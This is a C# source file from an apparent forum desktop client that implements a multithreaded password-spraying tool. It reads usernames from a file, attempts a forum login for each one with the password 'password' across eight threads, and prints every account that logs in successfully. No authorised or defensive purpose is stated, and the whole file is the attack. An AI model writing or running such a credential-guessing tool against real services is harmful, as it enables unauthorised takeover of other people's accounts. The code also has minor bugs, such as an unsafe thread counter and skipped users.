using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace PonyboxDesktop.Forum
{
    class PasswordTester
    {
        private string[] passwords = new string[]{ "password" };
        private string[] users;

        int running = 0;
        int tested = 0;

        public PasswordTester(string file)
        {
            this.users = File.ReadAllLines(file);
        }

        public void Process()
        {
            int loops = 8;
            int len = users.Length / loops;

            List<Thread> threads = new List<Thread>();

            for (int i = 0; i < loops; i++)
            {

                int start = i * len;

                Thread thread = new Thread(() => ProcessThread(start, len));
                thread.Start();
                running++;

                threads.Add(thread);
            }

            /*
            for (int i = 0; i < threads.Count; i++)
            {
            }
            */

            while(running > 0)
            {
                Console.WriteLine("{0} threads running, {1}/{2} users tested", running, tested, users.Length);
                Thread.Sleep(1000);
            }
                
        }

        public void ProcessThread(int start, int length)
        {
            CookieAwareWebClient c = new CookieAwareWebClient();

            Console.WriteLine("Thread for users {0}-{1} starting", start, start+length);

            for (int i = 0; i < length; i++)
            {
                string user = users[i + start];

                for (int j = 0; j < passwords.Length; j++)
                {
                    bool ok = ForumClient.LoginClient(users[i + start], passwords[j], c);

                    if (ok)
                    {
                        Console.WriteLine("Logged in with {0} - {1} ", users[i + start], passwords[j]);
                    }

                    Interlocked.Add(ref tested, 1);
                }
            }

            running--;
        }
    }
}
